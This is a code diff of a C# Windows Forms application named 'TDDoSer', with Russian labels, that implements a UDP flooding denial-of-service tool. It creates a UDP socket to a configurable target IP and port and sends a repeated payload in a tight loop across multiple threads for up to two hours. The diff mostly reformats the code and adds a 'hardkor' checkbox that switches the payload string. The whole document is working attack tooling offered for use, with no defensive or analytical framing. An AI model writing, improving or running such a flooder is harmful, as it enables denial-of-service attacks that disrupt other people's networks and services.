@@ -19,11 +19,11 @@ namespace TDDoSer
         #region Переменные
         private static readonly DateTime start = DateTime.Now;
         private static readonly int loggingTime = 5084;
-        private static int total = 0;
         private static int per = 0;
         private static int speed = 12;
-        private static readonly string p = "1234567890123456789012345678901234567890";
-        private static readonly string data = p + p + p + p + p + p + p + p + p + p +p +p;
+        private int total;
+        private static string p = "1234567890123456789012345678901234567890";
+        private static readonly string data = p + p + p + p + p + p + p + p + p + p + p + p;
         private static readonly byte[] dataBytes = Encoding.ASCII.GetBytes(data);
         private static string targetIP = "192.168.0.75";
         private static int port = 80;
@@ -33,6 +33,7 @@ namespace TDDoSer
         public Form1()
         {
             InitializeComponent();
+
             TextLabel.Text = Text;
 
         }
@@ -50,7 +51,7 @@ namespace TDDoSer
                     port = int.Parse(TargetTextBox.Text.Split(':')[1]);
                 }
 
-              
+
                 try
                 {
                     totalTime = 2147483646;
@@ -59,7 +60,10 @@ namespace TDDoSer
                 {
                     totalTime = 2147483646;
                 }
-                if (totalTime > 2 * 60 * 60) totalTime = 2 * 60 * 60;
+                if (totalTime > 2 * 60 * 60)
+                {
+                    totalTime = 2 * 60 * 60;
+                }
 
                 IPEndPoint ep = new IPEndPoint(IPAddress.Parse(targetIP), port);
 
@@ -75,8 +79,10 @@ namespace TDDoSer
                 //Console.ForegroundColor = ConsoleColor.DarkRed;
 
                 //Console.WriteLine("Скорость: " + speed);
-                Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
-                client.SendTimeout = 100000;
+                Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp)
+                {
+                    SendTimeout = 100000
+                };
 
                 //Console.WriteLine("IP " + targetIP + "\nВремя:" + totalTime + "\n");
                 //Console.ForegroundColor = ConsoleColor.Red;
@@ -86,7 +92,7 @@ namespace TDDoSer
                 while (true)
                 {
                     per++;
-            
+
                     if (per > speed)
                     {
                         Thread.Sleep(2);
@@ -154,8 +160,8 @@ namespace TDDoSer
                     threads++;
                     ThreadsLabel.Text = "Потоков:" + threads.ToString();
                 }
-               
-               
+
+
             }
 
 
@@ -194,8 +200,8 @@ namespace TDDoSer
 
         public void ThreadDDStart()
         {
-            new Thread(() =>ddToolsStartAsync()).Start();
-            new Thread(() =>ddToolsStartAsync()).Start();
+            new Thread(() => ddToolsStartAsync()).Start();
+            new Thread(() => ddToolsStartAsync()).Start();
         }
         private void Form1_Load(object sender, EventArgs e)
         {
@@ -268,6 +274,18 @@ namespace TDDoSer
             STOP();
             //cmdDoSPing.Close();
 
+        }
+
+        private void guna2CheckBox1_CheckedChanged(object sender, EventArgs e)
+        {
+            if (hardkor.Checked)
+            {
+                p = "!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c";
+            }
+            else
+            {
+                p = "1234567890123456789012345678901234567890";
+            }
         }
     }
 }
